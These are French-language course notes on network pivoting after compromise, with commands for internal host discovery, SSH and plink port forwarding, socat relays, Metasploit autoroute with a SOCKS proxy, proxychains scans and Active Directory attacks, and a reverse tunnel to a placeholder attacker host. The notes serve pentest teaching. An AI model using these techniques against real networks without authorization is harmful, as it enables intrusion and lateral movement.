---
cssclasses:
  - max
aliases:
  - "PIVOTING & POST-COMPROMISSION RÉSEAU"
  - "01-19 | PIVOTING & POST-COMPROMISSION RÉSEAU"
archetype: cour
module: "GEN (Culture Générale & Hors Cursus)"
tags:
  - attaque/pivoting
  - pentest/post-exploitation
  - attaque/mouvement-lateral
  - attaque/tunneling
  - attaque/proxy-socks
  - protocole/ssh
  - protocole/ssh/port-forwarding
  - outil/metasploit
  - outil/proxychains
  - outil/socat
  - outil/plink
  - attaque/reconnaissance
  - reseau/segmentation
  - microsoft/active-directory
  - os/windows
  - os/linux
  - distribution/kali-linux
  - commande/ipconfig
  - commande/bash
  - commande/ping
  - commande/arp
  - commande/route
---

# 01-19 | PIVOTING & POST-COMPROMISSION RÉSEAU

> [!goal] Objectifs Pédagogiques
> À la fin de cette fiche, je dois être capable de :
> 1.  Identifier les interfaces réseau internes non visibles depuis Kali.
> 2.  Établir un pivot SSH (Local et Remote Port Forwarding).
> 3.  Utiliser Metasploit pour créer un SOCKS proxy pivotant.
> 4.  Utiliser ProxyChains pour scanner derrière le pivot.
> 5.  Réaliser un pivot Windows avec socat ou plink.
> 6.  Chaîner plusieurs pivots pour atteindre un sous-réseau profond.
> 7.  Scanner un réseau AD entier depuis la machine pivot.

## 📝 Synthèse du Cours

Le *pivoting* est une technique avancée de *post-exploitation* utilisée en cybersécurité, notamment lors de tests d'intrusion ou d'attaques par des menaces persistantes avancées (APT). Son objectif principal est de **transformer un accès initial sur une machine compromise en un accès étendu à l'ensemble d'un réseau interne** qui serait autrement inaccessible directement depuis la machine de l'attaquant. Ce processus implique souvent l'utilisation de tunnels et de proxys pour contourner les mesures de sécurité telles que les pare-feu ou la segmentation réseau.

### 1. Comprendre le Pivoting et ses Objectifs

Le *pivoting* permet à un attaquant de **déplacer latéralement** (lateral movement) au sein d'un réseau en utilisant une machine compromise comme "tremplin" ou "point de pivot". Cela est crucial lorsque des services internes ou des sous-réseaux sont isolés et ne peuvent être atteints directement depuis l'extérieur.

*   **Objectif principal** : étendre la portée d'une attaque depuis un point d'accès initial (foothold) vers des zones plus profondes et sensibles du réseau cible.
*   **Cibles typiques** :
    *   Systèmes Windows compromis (via Meterpreter, WinRM, Impacket).
    *   Systèmes Linux compromis (via SSH ou reverse shell).
    *   Contrôleurs de Domaine (Domain Controllers) situés dans des sous-réseaux différents.
    *   Clients Windows ou serveurs isolés.

> [!note] Définition Clé
> **Pivoting** : Technique consistant à utiliser un système compromis comme point de relais (pivot) pour accéder et attaquer d'autres systèmes sur le même réseau ou des sous-réseaux adjacents qui ne sont pas directement accessibles depuis la machine de l'attaquant.

### 2. Découverte du Réseau Interne depuis la Machine Compromise

Avant d'établir un pivot, il est essentiel de comprendre la topologie réseau de la machine compromise. Cela permet d'identifier les sous-réseaux cachés et les cibles potentielles.

*   **Sur Linux compromis** :
    ```bash
    ip a         # Affiche les adresses IP des interfaces réseau.
    ip route     # Affiche la table de routage.
    ip neigh     # Affiche le cache ARP (voisins).
    ```
*   **Sur Windows compromis** :
    ```cmd
    ipconfig /all # Affiche les configurations IP complètes.
    route print   # Affiche la table de routage.
    arp -a        # Affiche le cache ARP.
    ```
*   **Identification de sous-réseaux** : Rechercher des interfaces réseau ayant des adresses IP différentes du réseau externe accessible depuis votre machine Kali.
*   **Découverte d'hôtes vivants (ping rapide)** :
    *   **Windows** : `for /L %i in (1,1,254) do ping -n 1 10.10.20.%i | find "TTL="`
    *   **Linux** : `for i in {1..254}; do ping -c1 10.10.20.$i | grep from; done`

### 3. Techniques de Pivot

Le *pivoting* s'appuie sur diverses techniques de tunnellisation et de proxyfication pour acheminer le trafic.

#### 3.1. Pivot SSH (Linux → Réseau Interne)

SSH est un outil polyvalent pour le *pivoting* grâce à ses capacités de *port forwarding* (redirection de port).

*   **Local Port Forwarding (`ssh -L`)** : Permet de mapper un port local de votre machine d'attaque vers un port sur une machine cible via la machine pivot. Utile pour accéder à des services distants comme s'ils s'exécutaient localement.
    *   Exemple : `ssh -L 9999:10.10.20.5:3389 user@192.168.56.20`
        *   Le port RDP (3389) de `10.10.20.5` (machine interne) devient accessible via `localhost:9999` sur Kali.
*   **Remote Port Forwarding (`ssh -R`)** : Permet de rendre un service local de votre machine d'attaque accessible depuis la machine pivot (et potentiellement depuis le réseau interne de la victime). Utile pour exposer un service d'écoute sur votre machine d'attaque au réseau interne de la victime.
    *   Exemple : `ssh -R 4444:127.0.0.1:22 user@192.168.56.20`
        *   Le port SSH (22) de votre machine Kali devient accessible depuis la machine pivot (`192.168.56.20`) sur le port `4444`.
*   **Dynamic Port Forwarding (`ssh -D`) (SOCKS Proxy)** : Crée un proxy SOCKS local sur votre machine d'attaque. Tout le trafic envoyé à ce proxy sera routé via le tunnel SSH vers la machine pivot, puis vers le réseau interne.
    *   Exemple : `ssh -D 1080 user@192.168.56.20`
        *   Crée un proxy SOCKS sur le port `1080` de votre machine Kali.

#### 3.2. Pivot Windows (plink, socat, SSH inversé)

Pour les systèmes Windows compromis, des outils spécifiques peuvent être utilisés pour établir des tunnels.

*   **Utiliser `plink` pour créer un tunnel** : `plink.exe` est la version en ligne de commande de PuTTY, utile pour le *pivoting* sous Windows.
    *   Exemple : `plink.exe -ssh -L 9999:10.10.20.5:445 kali@192.168.56.101`
        *   Le port SMB (445) de la machine interne `10.10.20.5` est accessible via `localhost:9999` sur Kali.
*   **Utiliser `socat` (si présent)** : `socat` est un outil polyvalent pour le transfert de données bidirectionnel, capable de créer des redirections de port et des relais.
    *   Exemple : `socat TCP-LISTEN:4444,fork TCP:10.10.20.5:3389`
        *   Écoute sur le port `4444` de la machine compromise et redirige le trafic vers le port `3389` de `10.10.20.5`.
*   **Reverse SSH tunnel Windows → Kali (via dropbear ou OpenSSH)** : similaire au *Remote Port Forwarding* SSH.
    *   Exemple : `plink.exe -R 5555:localhost:445 kali@ATTACKER_IP`

#### 3.3. Pivot via Metasploit (Autoroute + SOCKS)

Metasploit offre des modules puissants pour le *pivoting*, particulièrement efficaces pour les sessions *Meterpreter* sur Windows.

1.  **Ajouter une route (`autoroute`)** : Permet à Metasploit de connaître les sous-réseaux accessibles via la session compromise.
    *   Depuis une session Meterpreter : `run autoroute -s 10.10.20.0/24`
2.  **Activer le proxy SOCKS4** : Un module auxiliaire permet de créer un proxy SOCKS à travers la session Meterpreter.
    *   `use auxiliary/server/socks_proxy`
    *   `set VERSION 4a`
    *   `run` (le proxy écoute par défaut sur le port 1080).

### 4. Utilisation de ProxyChains pour l'Attaque

Une fois un proxy SOCKS (par exemple, via SSH -D ou Metasploit) établi, `ProxyChains` permet de rediriger le trafic de n'importe quel outil réseau à travers ce proxy.

*   **Configuration de ProxyChains** : Éditer le fichier de configuration (`/etc/proxychains.conf` ou `/etc/proxychains4.conf`) et ajouter la ligne du proxy SOCKS.
    *   Exemple : `socks4 127.0.0.1 1080`
*   **Utilisation** : Préfixer n'importe quelle commande avec `proxychains`.
    *   Exemple de scan : `proxychains nmap -sT -Pn 10.10.20.0/24`
    *   Exemples d'attaques :
        *   `proxychains crackmapexec smb 10.10.20.5 -u user -p pass`
        *   `proxychains smbclient //10.10.20.5/share -U user`
        *   `proxychains ldapsearch -H ldap://10.10.20.5 -x -b "DC=lab,DC=local"`
        *   `proxychains GetUserSPNs.py`
    *   `ProxyChains` permet de lancer des attaques Kerberos/AD via le pivot, rendant des attaques sophistiquées possibles sur le réseau interne.

### 5. Chaînage de Plusieurs Pivots (Multi-hop)

Le *pivoting multi-hop* implique de chaîner plusieurs machines compromises pour atteindre des sous-réseaux encore plus profonds.

*   **Scénario** : Kali → Windows 1 (pivot 1) → Linux Interne (pivot 2) → DC profond.
*   **Principe** : Utiliser un premier pivot pour accéder à une deuxième machine compromise, puis établir un nouveau pivot depuis cette deuxième machine pour atteindre la cible finale.
*   **Exemple de commande pour un chaînage de proxys** :
    ```bash
    proxychains -q proxychains -f /etc/proxychains2.conf nmap 10.10.30.0/24
    ```
    *   Cela nécessite une configuration attentive des fichiers `proxychains.conf` ou l'utilisation d'outils comme `chisel` ou `ligolo-ng` pour des chaînes plus complexes.

### 6. Fiche Pivot & Access Map

Documenter les pivots est essentiel pour la compréhension et la présentation des chemins d'attaque. Une "Attack Path Map" peut visualiser les étapes : `Lieu → Pivot → Sous-réseau → AD`.

| Pivot           | Réseau accessible | Type de tunnel | Outil          | Accès obtenu | Notes      |
| :-------------- | :---------------- | :------------- | :------------- | :----------- | :--------- |
| Linux compromis | 10.10.20.0/24     | SOCKS          | SSH -D 1080    | Scan + SMB   | OK         |
| Windows 1       | 10.10.30.0/24     | Metasploit     | autoroute + socks | AD access    | Priorité haute |
| Linux interne   | DC                | SSH + ProxyChains | Full domain enum | OK           |

## 🧠 Carte Mentale / Schéma
```mermaid
graph TD
    A[Attaquant Kali] -->|Accès Initial (Shell/Meterpreter)| B{Machine Compromise 1};
    B -- ip a / ipconfig / route print --> C(Découverte Réseau Interne);
    C --> D{Pivotage};

    D -- "SSH Local Port Fwd (-L)" --> D1[Accès Service Interne sur Kali];
    D -- "SSH Remote Port Fwd (-R)" --> D2[Exposition Service Kali sur Réseau Interne];
    D -- "SSH Dynamic Fwd (-D) / Metasploit SOCKS" --> D3[Proxy SOCKS sur Kali];

    D3 -->|Avec ProxyChains| E(Scan & Attaque Réseau Interne);
    E --> F[Cibles Internes (SMB, LDAP, RDP)];

    D --> G{Chaînage de Pivots};
    G -- "Pivot 1 -> Pivot 2" --> H(Machine Compromise 2);
    H -- "Pivot 2 -> Cible Profonde" --> I(Réseau Profond / Domain Controller);

    subgraph Techniques de Pivot
        D1; D2; D3; G;
    end

    subgraph Outils Clés
        O1[SSH]
        O2[Metasploit]
        O3[ProxyChains]
        O4[socat / plink]
        O5[Impacket]
        O6[Nmap]
    end

    style A fill:#DDEBF7,stroke:#333,stroke-width:2px;
    style B fill:#FFF2CC,stroke:#DAA520,stroke-width:2px;
    style C fill:#E2F0D9,stroke:#6B8E23,stroke-width:2px;
    style D fill:#FFF2CC,stroke:#DAA520,stroke-width:2px;
    style D1 fill:#FBE4D5,stroke:#DC5F00,stroke-width:1px;
    style D2 fill:#FBE4D5,stroke:#DC5F00,stroke-width:1px;
    style D3 fill:#FBE4D5,stroke:#DC5F00,stroke-width:1px;
    style E fill:#F2F2F2,stroke:#666,stroke-width:1px;
    style F fill:#FBE4D5,stroke:#DC5F00,stroke-width:1px;
    style G fill:#FFF2CC,stroke:#DAA520,stroke-width:2px;
    style H fill:#FFF2CC,stroke:#DAA520,stroke-width:2px;
    style I fill:#FBE4D5,stroke:#DC5F00,stroke-width:1px;
    style O1 fill:#D6EAF8,stroke:#3498DB,stroke-width:1px;
    style O2 fill:#D6EAF8,stroke:#3498DB,stroke-width:1px;
    style O3 fill:#D6EAF8,stroke:#3498DB,stroke-width:1px;
    style O4 fill:#D6EAF8,stroke:#3498DB,stroke-width:1px;
    style O5 fill:#D6EAF8,stroke:#3498DB,stroke-width:1px;
    style O6 fill:#D6EAF8,stroke:#3498DB,stroke-width:1px;
```

## ❓ Quiz de Révision (Active Recall)
> [!question] Question 1
> Qu'est-ce que le *pivoting* en cybersécurité et quel est son objectif principal ?
> > [!success]- Réponse
> > Le *pivoting* est une technique qui consiste à utiliser un système déjà compromis comme point de relais pour accéder à d'autres systèmes ou sous-réseaux qui ne sont pas directement accessibles depuis la machine de l'attaquant. Son objectif principal est d'étendre la portée de l'attaque en contournant les mesures de sécurité telles que les pare-feu ou la segmentation réseau, et ainsi d'atteindre des cibles plus profondes et sensibles au sein du réseau interne.

> [!question] Question 2
> Citez et expliquez brièvement les trois types de *port forwarding* SSH utilisés pour le *pivoting*.
> > [!success]- Réponse
> > Les trois types de *port forwarding* SSH sont :
> > 1.  **Local Port Forwarding (`ssh -L`)** : Il établit un tunnel depuis votre machine locale (attaquant) vers un port d'une machine cible, via la machine pivot. Le service distant devient accessible sur un port local de votre machine.
> > 2.  **Remote Port Forwarding (`ssh -R`)** : Il permet de rendre un service d'écoute sur votre machine locale (attaquant) accessible depuis la machine pivot (et potentiellement son réseau interne) sur un port spécifié.
> > 3.  **Dynamic Port Forwarding (`ssh -D`)** : Il crée un proxy SOCKS local sur votre machine d'attaque. Tout le trafic configuré pour utiliser ce proxy sera routé via le tunnel SSH vers la machine pivot, puis vers le réseau interne, permettant une flexibilité pour scanner et attaquer.

> [!question] Question 3
> Comment Metasploit et ProxyChains sont-ils combinés pour réaliser un *pivoting* et scanner un réseau interne ?
> > [!success]- Réponse
> > Dans Metasploit, après avoir obtenu une session Meterpreter sur une machine compromise, on utilise la commande `run autoroute -s [sous-réseau]` pour ajouter une route vers le réseau interne. Ensuite, on active le module `auxiliary/server/socks_proxy` (généralement sur le port 1080). Sur la machine Kali de l'attaquant, `ProxyChains` est configuré en éditant `/etc/proxychains.conf` pour y ajouter le proxy SOCKS (`socks4 127.0.0.1 1080`). Une fois configuré, des outils comme Nmap peuvent être lancés via `proxychains nmap -sT -Pn [sous-réseau]` pour scanner le réseau interne en acheminant le trafic à travers le proxy Metasploit.